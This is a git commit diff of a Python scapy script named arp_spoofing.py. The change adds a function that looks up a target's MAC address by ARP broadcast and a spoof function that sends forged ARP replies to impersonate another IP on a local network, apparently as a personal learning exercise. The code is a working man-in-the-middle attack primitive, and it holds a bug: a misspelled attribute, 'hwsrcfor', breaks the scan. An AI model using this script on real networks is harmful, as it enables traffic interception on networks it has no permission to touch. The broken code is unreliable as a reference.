6bbd41a6623452074bae200ed7e13d79af073260
iliya52 <Dehsarvi.iliya@gmail.com>
2021-12-09 18:45:22 -0800

    Update arp_spoofing.py

--- arp_spoofing.py
+++ arp_spoofing.py
@@ -1,7 +1,17 @@
 #!/usr/bin/env python
 import scapy.all as scapy
 
-packet = scapy.ARP(op=2, pdst='192.168.89.134', hwdst='00-0C-29-4F-CF-16', psrc='192.168.89.2')
-packet.show()
-packet.summary()
-scapy.send(packet)
+def scan(IP):
+    arp_request = scapy.ARP(pdst=IP)
+    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')   
+    arp_request_broadcast = broadcast/arp_request
+    answered, _ = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)
+    return answered[0][1].hwsrcfor
+
+def spoof(target_ip, spoof_ip):
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=scan(target_ip), psrc=spoof_ip)
+    packet.show()
+    packet.summary()
+    scapy.send(packet)
+
+print(scan('10.20.3.134'))
